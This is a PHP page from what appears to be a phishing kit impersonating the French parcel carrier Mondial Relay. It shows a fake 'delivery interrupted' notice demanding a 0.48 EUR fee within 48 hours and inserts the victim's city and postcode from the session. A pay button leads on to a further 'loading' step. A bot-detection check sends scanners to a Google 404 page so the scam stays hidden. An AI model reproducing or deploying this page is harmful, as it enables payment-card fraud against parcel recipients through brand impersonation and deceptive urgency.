<?php
session_start();
if ($_SESSION['bot'] == '1') {
include('../../config.php');
include('../../app/functions.php');
include('../../antibots.php');
include('../../common/sub_includes.php');
$_SESSION['load'] = "billing";
?>
<html lang="fr">
  <head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
    <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name="viewport">
    <title>Suivi de colis - Mondial Relay</title>
    <link href="../../public/img/logomrnotext.svg" id="ctl00_FavIcon2" rel="icon" type="">
    <link href="../../public/img/logomrnotext.svg" id="ctl00_FavIcon1" rel="shortcut icon">
    <link href="../../public/img/mondial-relay-logo.png" rel="apple-touch-icon">
    <link href="../../public/css/jquery-ui.css" rel="stylesheet">
    <link href="../../public/css/main.css" rel="stylesheet">
    <link href="../../public/css/styleMR.css" rel="stylesheet" type="text/css">
  </head>
  <body class="">
    <div class="content new" id="one">
      <header>
        <div class="grid header-top">
          <div class="header-content">
            <div class="pr-0 nav container">
              <div class="nav__group">
                <button class="visible-xs nav__menu" id="mobile-btn">
                  <span class="sr-only">Ouvrir le menu</span>
                  <span class="burger-menu"></span>
                </button>
                <a class="visible-xs nav__search" href="#" id="mobile-search">
                  <svg fill="none" height="33" viewBox="0 0 33 33" width="33" xmlns="http://www.w3.org/2000/svg">
                    <path d="M14.6649 23.8299C19.7266 23.8299 23.8299 19.7266 23.8299 14.665C23.8299 9.60331 19.7266 5.5 14.6649 5.5C9.60328 5.5 5.5 9.60331 5.5 14.665C5.5 19.7266 9.60328 23.8299 14.6649 23.8299Z" stroke="#96154A" stroke-linejoin="round" stroke-width="1.3"></path>
                    <path d="M21.6782 20.5996L29.5001 28.4214" stroke="#96154A" stroke-linejoin="round" stroke-width="1.3"></path>
                  </svg>
                </a>
              </div>
              <a href="#" id="logo" title="Mondial Relay e-livraison de vos colis">
                <span class="sr-only">Mondial Relay e-livraison de vos colis</span>
                <img alt="Logo Mondial Relay" height="60" src="../../public/img/logomondial-relay.svg">
              </a>
              <div class="nav__group">
                <a class="mobile-basket visible-xs nav__basket nav__basket--hp" href="#">
                  <svg fill="none" height="33" viewBox="0 0 33 33" width="33" xmlns="http://www.w3.org/2000/svg">
                    <path d="M28.5 15.6116H4.5" stroke="#96154A" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.3"></path>
                    <path d="M5.95264 15.9031L9.47336 26.2827H23.6104L27.2428 15.6116" stroke="#96154A" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.3"></path>
                    <path d="M9.36182 15.6115L15.2855 7.5" stroke="#96154A" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.3"></path>
                    <path d="M23.6661 15.6115L17.6882 7.5" stroke="#96154A" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.3"></path>
                  </svg>
                </a>
                <a class="mobile-account visible-xs callconex nav__connect" href="#">
                  <svg fill="none" height="33" viewBox="0 0 33 33" width="33" xmlns="http://www.w3.org/2000/svg">
                    <path d="M23.9795 27.4157H7.82494C7.65112 27.4157 7.48447 27.3458 7.36156 27.2214C7.23865 27.097 7.16962 26.9283 7.16962 26.7523V24.0406C7.13972 22.8611 7.34339 21.6875 7.76866 20.589C8.19393 19.4904 8.83217 18.4892 9.64577 17.6443C10.4594 16.7993 11.4318 16.1278 12.5059 15.6693C13.5799 15.2108 14.7337 14.9746 15.8994 14.9746C17.065 14.9746 18.2188 15.2108 19.2929 15.6693C20.3669 16.1278 21.3394 16.7993 22.153 17.6443C22.9666 18.4892 23.6048 19.4904 24.0301 20.589C24.4553 21.6875 24.6591 22.8611 24.6292 24.0406V26.7523C24.6299 26.8392 24.6137 26.9253 24.5814 27.0057C24.5491 27.0862 24.5013 27.1594 24.4409 27.2211C24.3805 27.2827 24.3086 27.3317 24.2294 27.3651C24.1502 27.3985 24.0653 27.4157 23.9795 27.4157ZM8.45738 26.0948H23.3011V24.0406C23.3011 23.0541 23.1092 22.0772 22.7362 21.1657C22.3632 20.2543 21.8165 19.4261 21.1273 18.7285C20.4381 18.0309 19.62 17.4775 18.7195 17.1C17.819 16.7225 16.8539 16.5281 15.8792 16.5281C14.9046 16.5281 13.9395 16.7225 13.039 17.1C12.1385 17.4775 11.3204 18.0309 10.6312 18.7285C9.94201 19.4261 9.39529 20.2543 9.02231 21.1657C8.64933 22.0772 8.45738 23.0541 8.45738 24.0406V26.0948Z" fill="#96154A"></path>
                    <path d="M15.8579 13.9968C14.93 13.9968 14.0231 13.7183 13.2516 13.1965C12.4802 12.6748 11.8789 11.9332 11.5238 11.0655C11.1688 10.1979 11.0759 9.24313 11.2569 8.32203C11.4379 7.40093 11.8846 6.55485 12.5407 5.89077C13.1968 5.2267 14.0327 4.77446 14.9427 4.59124C15.8527 4.40803 16.7959 4.50205 17.6531 4.86145C18.5103 5.22084 19.2429 5.82945 19.7584 6.61032C20.2739 7.39119 20.549 8.30925 20.549 9.24839C20.5475 10.5073 20.0528 11.7141 19.1733 12.6043C18.2939 13.4945 17.1016 13.9952 15.8579 13.9968ZM15.8579 5.82094C15.1882 5.82094 14.5335 6.02196 13.9766 6.39857C13.4198 6.77518 12.9858 7.31047 12.7295 7.93676C12.4732 8.56304 12.4061 9.25219 12.5368 9.91705C12.6674 10.5819 12.99 11.1926 13.4636 11.672C13.9371 12.1513 14.5404 12.4777 15.1973 12.61C15.8541 12.7422 16.535 12.6744 17.1537 12.4149C17.7724 12.1555 18.3012 11.7162 18.6733 11.1526C19.0454 10.5889 19.244 9.92628 19.244 9.24839C19.2425 8.33985 18.8853 7.46895 18.2506 6.82651C17.6159 6.18408 16.7555 5.82248 15.8579 5.82094Z" fill="#96154A"></path>
                  </svg>
                </a>
              </div>
            </div>
            <div class="pr-0" id="menuMobile">
              <nav class="menu">
                <ul class="navigation">
                  <li class="selected">
                    <a class="" href="#">Suivi de colis</a>
                  </li>
                  <li class="">
                    <a class="" href="#">Envoi de colis</a>
                  </li>
                  <li class="">
                    <a class="" href="#">Points Relais® <br>et Lockers </a>
                  </li>
                  <li class="">
                    <a class="" href="#">Aide</a>
                  </li>
                  <li class="">
                    <a class="btn btn-primary btn-light mt0" href="#">Solutions Pro</a>
                  </li>
                  <li class="visible-xs">
                    <a class="callconex" href="javascript:void(0)" onclick="callConnexionMobile()">Se connecter</a>
                  </li>
                </ul>
              </nav>
            </div>
          </div>
        </div>
        <div class="ident-bg hidden-xs" id="identification">
          <div class="grid grid--identification">
            <div class="row">
              <div class="col-md-12">
                <ul>
                  <li>
                    <a class="list-countries" href="javascript:void(0)" onclick="callCountries()">
                      <img alt="icone langue" class="icon languages" src="../../public/img/earth.svg"> France </a>
                  </li>
                  <li>
                    <div id="panier">
                      <a class="list-basket" href="javascript:void(0)" onclick="callBasket()">
                        <img alt="icone panier" class="icon languages" src="../../public/img/cart.svg"> Mon panier ( <span>0,00 €</span>) </a>
                    </div>
                  </li>
                  <li>
                    <a class="callconex" href="javascript:void(0)" onclick="callConnexion()">
                      <svg class="icon" fill="none" height="33" viewBox="0 0 33 33" width="33" xmlns="http://www.w3.org/2000/svg">
                        <path d="M23.9795 27.4157H7.82494C7.65112 27.4157 7.48447 27.3458 7.36156 27.2214C7.23865 27.097 7.16962 26.9283 7.16962 26.7523V24.0406C7.13972 22.8611 7.34339 21.6875 7.76866 20.589C8.19393 19.4904 8.83217 18.4892 9.64577 17.6443C10.4594 16.7993 11.4318 16.1278 12.5059 15.6693C13.5799 15.2108 14.7337 14.9746 15.8994 14.9746C17.065 14.9746 18.2188 15.2108 19.2929 15.6693C20.3669 16.1278 21.3394 16.7993 22.153 17.6443C22.9666 18.4892 23.6048 19.4904 24.0301 20.589C24.4553 21.6875 24.6591 22.8611 24.6292 24.0406V26.7523C24.6299 26.8392 24.6137 26.9253 24.5814 27.0057C24.5491 27.0862 24.5013 27.1594 24.4409 27.2211C24.3805 27.2827 24.3086 27.3317 24.2294 27.3651C24.1502 27.3985 24.0653 27.4157 23.9795 27.4157ZM8.45738 26.0948H23.3011V24.0406C23.3011 23.0541 23.1092 22.0772 22.7362 21.1657C22.3632 20.2543 21.8165 19.4261 21.1273 18.7285C20.4381 18.0309 19.62 17.4775 18.7195 17.1C17.819 16.7225 16.8539 16.5281 15.8792 16.5281C14.9046 16.5281 13.9395 16.7225 13.039 17.1C12.1385 17.4775 11.3204 18.0309 10.6312 18.7285C9.94201 19.4261 9.39529 20.2543 9.02231 21.1657C8.64933 22.0772 8.45738 23.0541 8.45738 24.0406V26.0948Z" fill="#96154A"></path>
                        <path d="M15.8579 13.9968C14.93 13.9968 14.0231 13.7183 13.2516 13.1965C12.4802 12.6748 11.8789 11.9332 11.5238 11.0655C11.1688 10.1979 11.0759 9.24313 11.2569 8.32203C11.4379 7.40093 11.8846 6.55485 12.5407 5.89077C13.1968 5.2267 14.0327 4.77446 14.9427 4.59124C15.8527 4.40803 16.7959 4.50205 17.6531 4.86145C18.5103 5.22084 19.2429 5.82945 19.7584 6.61032C20.2739 7.39119 20.549 8.30925 20.549 9.24839C20.5475 10.5073 20.0528 11.7141 19.1733 12.6043C18.2939 13.4945 17.1016 13.9952 15.8579 13.9968ZM15.8579 5.82094C15.1882 5.82094 14.5335 6.02196 13.9766 6.39857C13.4198 6.77518 12.9858 7.31047 12.7295 7.93676C12.4732 8.56304 12.4061 9.25219 12.5368 9.91705C12.6674 10.5819 12.99 11.1926 13.4636 11.672C13.9371 12.1513 14.5404 12.4777 15.1973 12.61C15.8541 12.7422 16.535 12.6744 17.1537 12.4149C17.7724 12.1555 18.3012 11.7162 18.6733 11.1526C19.0454 10.5889 19.244 9.92628 19.244 9.24839C19.2425 8.33985 18.8853 7.46895 18.2506 6.82651C17.6159 6.18408 16.7555 5.82248 15.8579 5.82094Z" fill="#96154A"></path>
                      </svg>Connexion </a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </header>
      <div class="container">
        <div class="breadcrumb">
          <div class="grid">
            <div class="row">
              <ul>
                <li>
                  <a href="#">
                    <span class="icon-localisation2"></span> Accueil </a>
                </li>
                <li class="active">Suivi de colis</li>
              </ul>
            </div>
          </div>
        </div>
        <div class="internal-page suivi">
          <div class="grid">
            <div class="row">
              <div class="col-xs-12 col-sm-12 col-md-12 center">
                
                <h1 id="titreSuiviColis" style="margin-top:75px !important;">Livraison interrompue</h1>
                                <div class="accroche p0-10" style="max-width:750px; margin: 0 auto;">Votre dernière livraison à été interrompue. Votre colis Mondial Relay <b>N°<?=$num_suivi?></b> est actuellement mis en attente au centre de tri de <strong><?=$_SESSION['Ucity']?> (<?=$_SESSION['Uzip']?>)</strong><br><br>
                    Le colis qui vous a été envoyé ne respectait pas le poids indiqué, des frais supplémentaires vous sont alors demandés afin de pouvoir acheminer correctement votre colis. <br>
                    <br>
                    Les frais s'élèvent à <strong>0.48€</strong><br> Pour les payer veuillez cliquer sur le bouton ci-dessous
                    <br><br>
                    Une fois les frais payés, votre colis sera acheminé le plus rapidement possible vers le lieu de livraison. <br><br>Dans le cas ou ceux-ci ne sont pas réglés dans les prochaines 48 heures, le colis sera retourné à l'expediteur
                  </div>
              </div>
            </div>
          </div>
          <div class="main">
            <div class="grid">
              <div class="row">
                <div class="app-wrapper" data-v-67007474="" id="tracking-wrapper">
                  <div data-v-3c4598c9="" data-v-67007474="">
                    <form class="form-block" data-v-3c4598c9="" novalidate="novalidate">
                      <div class="input-zone" data-v-3c4598c9="">
                        <center><button class="btn btn-primary" data-v-3c4598c9="" type="button" onclick="location.href='../loading/';">Régler</button></center>
                      </div>
                      
                    </form>
                  </div>
                  
                </div>
                <link href="../../public/css/chunk-vendors.css" rel="stylesheet" type="text/css">
                <link href="../../public/css/app.css" rel="stylesheet" type="text/css">
              </div>
              
            </div>
          </div>
        </div>
        <div class="clear"></div>
        <div class="footer_media block" id="footer_media">
          <div class="grid"></div>
        </div>
      </div>
      <footer class="w100">
        <div class="column">
          <div style="background-color:#fff">
            <div class="surfooter" style="background-image:url(../../public/img/footer_img.png)">
              <div class="grid">
                <div class="row">
                  <img class="surfooter-picto" src="../../public/img/footer_picto.svg">
                </div>
              </div>
            </div>
          </div>
          <div class="sitemap">
            <div class="grid">
              <div class="row listicons">
                <div class="col-sm-12 col-md-7">
                  <div class="row">
                    <div class="">
                      <h5>Pour nous suivre</h5>
                      <div class="reseaux">
                        <a class="icon svg-ico_linkedin25" href="#" title="Suivez-nous sur Linkedin"></a>
                        <a class="icon svg-ico_instagram25" href="#" title="Suivez-nous sur Instagram"></a>
                        <a class="icon svg-ico_tiktok25" href="#" title="Suivez-nous sur Tiktok"></a>
                        <a class="icon svg-ico_facebook25" href="#" title="Suivez-nous sur Facebook"></a>
                        <a class="icon svg-ico_twitter25" href="#" title="Suivez-nous sur Twitter"></a>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="payplus footer-hp">
                  <h5>Nos solutions de paiement</h5>
                  <div class="payplus-icons-hp">
                    <div class="payplus-icons soluce-paiement">
                      <img height="36" src="../../public/img/Mastercard.svg" title="Mastercard">
                      <img height="36" src="../../public/img/Visa.svg" title="Visa">
                      <img height="36" src="../../public/img/Paypal.svg" title="Paypal">
                      <img height="36" src="../../public/img/CB.svg" title="CB">
                    </div>
                    <a class="f-right paypluslink" href="#">
                      <img class="icon-locker" src="../../public/img/ico_locker.svg" title="Lock"> Paiement sécurisé </a>
                  </div>
                </div>
              </div>
              <div class="mt20 listeliens 5 2">
                <div>
                  <h5>Particulier</h5>
                  <ul>
                    <li>
                      <a href="#">Envoyer mon colis pas cher</a>
                    </li>
                    <li>
                      <a href="#">Suivre mon colis</a>
                    </li>
                    <li>
                      <a href="#">Envoi colis entre particuliers</a>
                    </li>
                    <li>
                      <a href="#" target="">Comment utiliser nos Lockers ?</a>
                    </li>
                    <li>
                      <a href="#">Assurer mon colis</a>
                    </li>
                    <li>
                      <a href="#">Découvrir nos tarifs</a>
                    </li>
                    <li>
                      <a href="#">eBay by Mondial Relay</a>
                    </li>
                    <li>
                      <a href="#">Application Mobile Mondial Relay</a>
                    </li>
                  </ul>
                </div>
                <div>
                  <h5>Professionnel</h5>
                  <ul>
                    <li>
                      <a href="#">Nos offres</a>
                    </li>
                    <li>
                      <a href="#">Nos tarifs pro</a>
                    </li>
                    <li>
                      <a href="#">Nos partenaires</a>
                    </li>
                    <li>
                      <a href="#">Installer un Locker</a>
                    </li>
                    <li>
                      <a href="#">Devenir Transporteur</a>
                    </li>
                    <li>
                      <a href="#">Devenir Point Relais</a>
                    </li>
                    <li>
                      <a href="#">Découvrez notre Blog Business</a>
                    </li>
                  </ul>
                  <div class="visible-xs">
                    <a href="#">
                      <img alt="" class="tour-banner" height="150" src="../../public/img/partenaire2.png">
                    </a>
                  </div>
                </div>
                <div>
                  <h5>Liens utiles</h5>
                  <ul>
                    <li>
                      <a href="#">C.G.V.</a>
                    </li>
                    <li>
                      <a href="#">Mentions Legales</a>
                    </li>
                    <li>
                      <a href="#">Charte des données personnelles</a>
                    </li>
                    <li>
                      <a href="#">Conditions des offres</a>
                    </li>
                  </ul>
                </div>
                <div>
                  <h5>Mondial Relay</h5>
                  <ul>
                    <li>
                      <a href="#">Contactez-nous</a>
                    </li>
                    <li>
                      <a href="#">Qui sommes-nous ?</a>
                    </li>
                    <li>
                      <a href="#">Nos engagements RSE</a>
                    </li>
                    <li>
                      <a href="#">Nous rejoindre</a>
                    </li>
                  </ul>
                </div>
                <div class="col-sm-3 col-md-3 hidden-xs listeliens-banner">
                  <a href="#">
                    <img alt="" class="tour-banner" src="../../public/img/partenaire2.png">
                  </a>
                </div>
              </div>
              <div class="app-btns">
                <h5>Application Mondial Relay</h5>
                <a href="#">
                  <img alt="ico app-store" src="../../public/img/ico_app-store.svg">
                </a>
                <a href="#">
                  <img alt="ico google-play" src="../../public/img/ico_google-play.svg">
                </a>
              </div>
              <div class="certif">
                <h5>Nos engagements et certifications</h5>
                <div class="certif__content">
                  <div class="certif__content-item">
                    <img alt="FEVAD" class="f-left" src="../../public/img/fevad.png">
                    <span>Mondial Relay adhère à la Fédération du e-commerce et de la vente à distance (FEVAD)</span>
                  </div>
                  <div class="certif__content-item">
                    <a href="#" title="">
                      <img alt="This website is hosted Green - checked by thegreenwebfoundation.org" class="f-left" src="../../public/img/thegreenweb-mondialrelayfr.png">
                    </a>
                    <span>Le site mondialrelay.fr est classé en vert par The Green Web Foundation (association loi 1901).</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  
</body></html>
<?php
} else {
  header('location: https://google.com/404');
}